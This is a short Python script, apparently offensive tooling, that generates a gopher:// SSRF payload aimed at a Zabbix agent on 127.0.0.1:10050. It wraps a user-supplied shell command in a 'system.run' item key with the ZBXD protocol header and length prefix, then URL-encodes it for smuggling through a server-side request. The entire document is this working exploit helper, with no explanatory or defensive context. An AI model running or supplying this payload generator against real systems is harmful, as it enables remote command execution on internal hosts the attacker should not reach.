import struct
import urllib.parse


header = "ZBXD\x01"
key0 = input('Command: ')
key = f'system.run[({key0})]'
print("gopher://127.0.0.1:10050/_",end="")
print(urllib.parse.quote_plus(header).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":"),end="")
print(urllib.parse.quote_plus(struct.pack("<Q", len(key)+2).decode()).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":"),end="")
print(urllib.parse.quote_plus(key).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":"),end="")
